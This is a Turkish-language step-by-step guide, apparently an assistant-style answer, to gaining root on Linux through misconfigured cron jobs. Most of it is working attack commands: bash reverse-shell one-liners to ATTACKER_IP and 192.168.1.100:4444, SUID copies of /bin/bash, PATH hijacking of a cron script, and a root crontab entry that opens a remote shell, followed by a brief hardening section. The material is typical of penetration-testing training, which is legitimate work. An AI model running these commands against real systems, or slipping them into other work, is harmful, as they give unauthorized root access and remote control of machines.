Cron job’lar üzerinden privilege escalation (privilege escalation via cron jobs) işlemi, genellikle yanlış yapılandırılmış veya izinleri yanlış ayarlanmış cron işlerini hedef alarak gerçekleştirilir. Aşağıda detaylı bir rehber sunuyorum:

---

### **Cron Jobs Üzerinden Privilege Escalation Teknikleri**

#### 1. **Cron Jobs Nedir?**
Cron, Unix tabanlı işletim sistemlerinde görevlerin belirli zamanlarda otomatik olarak çalıştırılmasını sağlayan bir zamanlayıcıdır. Görevler genellikle `/etc/crontab`, `/etc/cron.d/` dizinindeki dosyalarda veya kullanıcıya özel olarak `crontab -e` ile tanımlanır.

---

#### 2. **Cron Job'ların Keşfi**
Cron job'ları analiz etmek için aşağıdaki komutları kullanabilirsiniz:

```bash
# Sistem geneli cron işleri
cat /etc/crontab

# Belirli kullanıcıya ait cron işleri
crontab -l -u <username>

# /etc/cron.d/ dizinindeki dosyalar
ls -l /etc/cron.d/

# Günlük, haftalık veya aylık cron işleri
ls -l /etc/cron.daily
ls -l /etc/cron.weekly
ls -l /etc/cron.monthly
```

---

#### 3. **Potansiyel Zayıflıkları Belirleme**
Cron job’larda dikkat edilmesi gereken zafiyetler şunlardır:

- **Yanlış İzinler:** Eğer bir cron job dosyası yazılabilir durumdaysa (`world-writable` veya `group-writable`), bu dosya değiştirilebilir ve saldırgan komutlar eklenebilir.
- **Yürütülen Komutlar:** Cron job’ın çalıştırdığı betik veya ikili dosyanın izinleri düzgün yapılandırılmamışsa, bu dosya değiştirilebilir.
- **PATH Değeri:** Cron job, `PATH` değişkeninde kontrolsüz bir yol içeriyorsa, kötü amaçlı bir dosya çalıştırılabilir.
- **Komut Enjeksiyonu:** Cron job içeriği kullanıcı girişlerini güvence altına almadan çalıştırıyorsa, komut enjeksiyonuna açık olabilir.
- **Zamanlanmış Görev Çıktıları:** Çıktılar hassas bilgiler sızdırıyor olabilir.

---

#### 4. **Privesc İçin Adım Adım Strateji**

##### **A. Yazılabilir Cron Job veya Script Bulma**
Cron job veya çalıştırdığı dosya yazılabilir ise:

1. **Yazılabilirliği kontrol edin:**
   ```bash
   ls -la /path/to/script
   ```
   veya
   ```bash
   find /etc/cron* -type f -writable 2>/dev/null
   ```

2. **Kötü amaçlı kod ekleyin:**
   Cron job tarafından çalıştırılan dosyayı aşağıdaki gibi değiştirin:
   ```bash
   echo "bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1" >> /path/to/script
   ```
   veya mevcut kodu root erişimiyle düzenleyin:
   ```bash
   echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /path/to/script
   ```

##### **B. PATH Manipülasyonu ile Zafiyet Sömürüsü**
Cron job'ın `PATH` değişkenini doğru şekilde tanımlamadığını fark ederseniz:

1. **Örnek Cron Job:**
   ```bash
   * * * * * root backup.sh
   ```

2. **PATH Değeri Kontrolü:**
   Eğer `backup.sh` tam bir yol içermiyorsa ve `PATH` global bir değişken ise, kendi `backup.sh` dosyanızı oluşturup saldırı gerçekleştirebilirsiniz.

3. **Kendi `backup.sh` dosyanızı oluşturun:**
   ```bash
   echo "/bin/bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1" > /tmp/backup.sh
   chmod +x /tmp/backup.sh
   export PATH=/tmp:$PATH
   ```

##### **C. World-Writable Dizinde Kötü Amaçlı Dosya Yükleme**
1. Eğer cron job aşağıdaki gibi bir dosyayı yazılabilir bir dizinden çağırıyorsa:
   ```bash
   * * * * * root /tmp/cleanup.sh
   ```

2. **cleanup.sh dosyasını değiştirin:**
   ```bash
   echo "chmod +s /bin/bash" > /tmp/cleanup.sh
   chmod +x /tmp/cleanup.sh
   ```

3. Dosya değiştikten sonra cron job çalıştığında `/bin/bash` root yetkisine sahip olacaktır.

##### **D. Output ve Log Dosyalarına Komut Ekleme**
Eğer cron job çıktıları bir dosyaya yazıyorsa, log dosyasına komut ekleyebilirsiniz:

```bash
echo "*/5 * * * * root bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" >> /var/spool/cron/root
```

---

#### 5. **Pratik Örnek: Yazılabilir Bir Cron Job ile Root Yetkisi**
##### Örnek Senaryo:
Cron job dosyası:
```bash
* * * * * root /home/user/backup.sh
```
`/home/user/backup.sh` dosyası şu şekilde yazılabilir:
```bash
-rw-rw-r-- 1 user user 47 Jan 1 12:00 /home/user/backup.sh
```

##### Sömürü:
1. **Backup scriptini düzenleyin:**
   ```bash
   echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" > /home/user/backup.sh
   chmod +x /home/user/backup.sh
   ```

2. **Reverse Shell Dinleyicisini Başlatın:**
   Kali Linux'ta:
   ```bash
   nc -lvnp 4444
   ```

3. Bir dakika içinde reverse shell root yetkisiyle size bağlanacaktır.

---

#### 6. **Korunma Yöntemleri**
1. Cron job’ların çalıştırdığı tüm dosyaların izinlerini sıkı tutun:
   ```bash
   chmod 700 /path/to/cronjob
   ```

2. PATH değişkenini açıkça tanımlayın:
   ```bash
   PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
   ```

3. Cron işlerini düzenli olarak inceleyin ve yalnızca güvenilir kullanıcıların erişmesine izin verin:
   ```bash
   chown root:root /etc/crontab
   chmod 600 /etc/crontab
   ```

4. Yazılabilir dizinlerde cron job çağrılmasına izin vermeyin.

5. Script içeriklerinde kullanıcı girdilerini sanitize edin.

---
